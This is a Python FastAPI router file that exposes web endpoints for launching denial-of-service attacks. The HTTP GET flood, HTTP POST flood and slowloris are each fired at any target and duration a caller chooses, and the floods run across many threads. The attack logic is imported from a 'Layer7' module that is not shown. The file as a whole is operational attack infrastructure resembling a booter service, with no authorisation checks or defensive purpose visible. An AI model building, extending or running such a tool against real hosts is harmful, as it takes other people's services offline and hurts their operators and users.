from fastapi import APIRouter, Request
from denialofservice import Layer7
from globals import NUMBER_OF_THREADS
from threading import Thread
from log import log

layer7_router = APIRouter()

@layer7_router.post("/httpGETflood")
async def http_get_flood(time: int, target: str, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.http_get_flood, args=(target, time,))
            t.start()
        log.info(f"{target} HTTP-GET-FLooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} HTTP-GET-FLood from {request.client.host} for {time} seconds could not be triggered")

@layer7_router.post("/httpPOSTflood")
async def http_post_flood(time: int, target: str, payload: str, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.http_post_flood, args=(target, time, payload,))
            t.start()
        log.info(f"{target} HTTP-POST-FLooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} HTTP-POST-FLood from {request.client.host} for {time} seconds could not be triggered")

@layer7_router.post("/slowloris")
async def slow_loris(target: str, port: int, time: int, request: Request):
    try:
        Layer7.slow_loris(target, port, time)
        log.info(f"{target} SLOW-Loris from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target} SlOW-Loris from {request.client.host} for {time} seconds could not be triggered")